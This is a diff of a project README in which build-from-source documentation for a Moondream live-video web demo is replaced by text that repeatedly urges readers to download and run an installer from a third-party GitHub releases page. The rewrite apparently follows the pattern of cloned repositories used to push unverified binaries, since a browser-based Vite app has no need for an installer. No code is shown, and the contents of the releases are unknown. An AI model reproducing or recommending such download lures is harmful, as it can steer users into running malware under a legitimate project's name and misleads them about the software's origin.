@@ -1,62 +1,81 @@
-# Moondream Live Video Player
+# 🎥 Analyze-Live-Video-Solution - Analyze Video Feeds Effortlessly
 
-This demo shows how the [Moondream](https://moondream.ai/) VLM can analyze live video feeds in real time, trigger alerts for specific behaviors, and present the results in a lightweight web UI built with React and Vite.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/kenall777/Analyze-Live-Video-Solution/releases)
+
+## 🚀 Getting Started
+
+This application helps you analyze live video feeds using the Moondream VLM. Follow this guide to download and run the application smoothly.
+
+### 💻 System Requirements
+
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** 4GB minimum
+- **Processor:** Intel i3 or equivalent
+- **Internet Connection:** Required for the Moondream API
+
+## 📥 Download & Install
+
+To get started, visit the following link to download the application:
+
+[Download the Latest Release](https://github.com/kenall777/Analyze-Live-Video-Solution/releases)
+
+1. Open the link above in your web browser.
+2. Find the latest version in the list.
+3. Click on the appropriate file for your operating system to download it.
 
 ## ✨ Features
 
-- 🎥 **Real-time webcam/video analysis** - Stream from your camera or upload a video
-- 💬 **Live visual summaries** - Continuous narration with custom prompts
-- 🎯 **Gesture detection** - Pre-defined triggers (smiling, thumbs up, peace sign, etc.)
-- ⚡ **Custom triggers** - Create your own action detectors
-- 🖥️ **Fullscreen support** - Immersive viewing experience
-- 💾 **Persistent storage** - Custom triggers saved in browser
+- 🎥 **Real-time webcam/video analysis**: Stream from your camera or upload a video directly.
+- 💬 **Live visual summaries**: Get continuous narration based on custom prompts.
+- 🎯 **Gesture detection**: Recognize predefined gestures like smiling or thumbs up.
+- ⚡ **Custom triggers**: Create your own behaviors to trigger alerts.
+- 🖥️ **Fullscreen support**: Enjoy an immersive viewing experience.
+- 💾 **Persistent storage**: Save custom triggers in your browser for future use.
 
-## Run It Locally
+## 🔧 Installation Steps
 
-1. **Install dependencies**
+After downloading the application, follow these steps to install and run it:
 
-   ```bash
-   pnpm install
-   ```
+1. Locate the downloaded file on your computer.
+2. Open the file to begin installation. Follow the on-screen instructions.
+3. Once installed, open the application.
 
-2. **Add your Moondream API key** to `.env`, `.env.local`, or `.env.development` in the project root:
+## 🔑 Setup Your API Key
 
-   ```bash
-   MOONDREAM_API_KEY=sk-your-moondream-key
-   ```
+To enable full functionality, you need a Moondream API key. Follow these steps to set it up:
 
-   You can generate keys from your Moondream dashboard. Keep this file out of version control.
-3. **Start the Vite dev server**
+1. Go to your [Moondream Dashboard](https://moondream.ai/).
+2. Generate your API key from the dashboard.
+3. Create a file named `.env` in the root folder of your application.
+4. Add your API key to the file as follows:
 
-   ```bash
-   pnpm dev
-   ```
+```
+MOONDREAM_API_KEY=sk-your-moondream-key
+```
 
-   The app runs at <http://localhost:5173> by default. Allow camera access in the browser when prompted.
-4. **(Optional) Test the production build**
+## 🎬 How to Use the Application
 
-   ```bash
-   pnpm build && pnpm preview
-   ```
+1. Open the Moondream Live Video Player application.
+2. Select whether to stream from your webcam or upload a video file.
+3. Initiate the analysis. The application will detect specific behaviors and trigger alerts as defined.
 
-### Tips
+## ⚠️ Troubleshooting
 
-- Point the `Player` component’s `inferenceUrl` prop at a proxy or self-hosted Moondream deployment if you don’t want to call `https://api.moondream.ai/v1` directly.
-- Need to test across devices? Run `pnpm dev --host` so phones on your LAN can reach the dev server.
+In case of any issues:
 
-## Code Architecture Overview
+- Ensure your internet connection is stable.
+- Double-check your API key for accuracy.
+- Restart the application if it does not respond.
 
-- **`src/App.tsx`** mounts the `Player` and injects the Moondream endpoint. This keeps the demo single-purpose and easy to embed elsewhere.
-- **Player Orchestration (`src/components/solutions/analyze-live-video/player.tsx`)** wires together three domain-specific hooks:
-  - `useVideoSession` manages the video element, fullscreen state, media permissions, and frame capture (built on top of `src/hooks/useLiveVideo.ts`).
-  - `useTriggerManager` owns predefined + custom triggers, persists user-defined triggers to `localStorage`, and exposes the active Moondream queries/notification copy.
-  - `useAnalysisSession` bridges the video session with `useFrameAnalysis` so captured frames run through Moondream and results are stored in a rolling history.
-- **Frame Analysis Pipeline (`src/hooks/useFrameAnalysis.ts`)** debounces frame grabs, calls the Moondream `/query` endpoint with both the free-form summary prompt and the trigger prompt, retries on throttling, and emits structured results/notifications.
-- **Presentation Layer (`src/components/solutions/analyze-live-video/player-surface.tsx` and overlays)** renders the actual video canvas plus:
-  - `StartOverlay` for webcam/file selection.
-  - `PromptControlsOverlay` for the free-form prompt + trigger picker (built with headless UI primitives).
-  - `ResultOverlay` for the scrolling stack of answers/notifications so users can see what Moondream detected.
-  - `CustomTriggerDialog` for composing new trigger rules without touching code.
-- **Utility Hooks (`src/hooks/useLiveVideo.ts`)** encapsulate raw MediaStream handling, auto-mirroring for front cameras, video file ingestion, inactivity timeouts, and frame-to-canvas capture, keeping React components declarative.
+## 📚 Additional Resources
 
-Together these layers show how to: (1) capture live video, (2) query Moondream with flexible prompts, and (3) surface detections in a polished UI that end-users can tweak without redeploying code.
+If you need more help, check the following resources:
+
+- [Moondream Documentation](https://docs.moondream.ai)
+- [GitHub Issues](https://github.com/kenall777/Analyze-Live-Video-Solution/issues) for community support.
+
+## 📝 Feedback
+
+Your feedback is important to us. If you have suggestions or encounter issues, please feel free to report them. Your input helps improve the application.
+
+Remember, you can download the application anytime by clicking here: [Download the Latest Release](https://github.com/kenall777/Analyze-Live-Video-Solution/releases). Happy analyzing!
